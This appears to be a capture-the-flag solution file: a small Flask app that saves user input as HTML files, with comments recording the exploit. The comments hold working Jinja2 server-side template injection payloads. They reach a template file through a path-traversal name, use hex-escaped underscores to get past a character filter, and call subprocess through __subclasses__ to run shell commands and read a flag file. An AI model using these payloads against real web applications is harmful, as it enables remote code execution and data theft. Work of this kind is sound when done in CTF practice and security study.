from werkzeug.urls import url_fix
from secrets import token_urlsafe
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html", error=request.args.get("error"))

@app.route("/new", methods=["POST"])
def create():
    content = request.form.get("content", "")
    if "_" in content or "/" in content:  # xss without "_" or "/" ?
        return redirect(url_for("index", error="bad_content"))
    if len(content) > 512:  # just long texts... 
        return redirect(url_for("index", error="long_content", len=len(content)))
    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"  #random string url... 
    with open(name, "w") as f:
        f.write(content)
    return redirect(name)

# ..\templates\errors\aa
# {{ 7 * 7 }} ssti
# /?error=aa-9LJmVZwzYrY 

# ..\templates\errors\123456789012345678901234568960123456789012345678901234567890123456789012345678901234567890123456789012345678 {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(273)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}
# ..\templates\errors\123456789012345678901234567890125626789012345678901234567890123456789012345678901234567890123456789012345678 {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(273)('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}
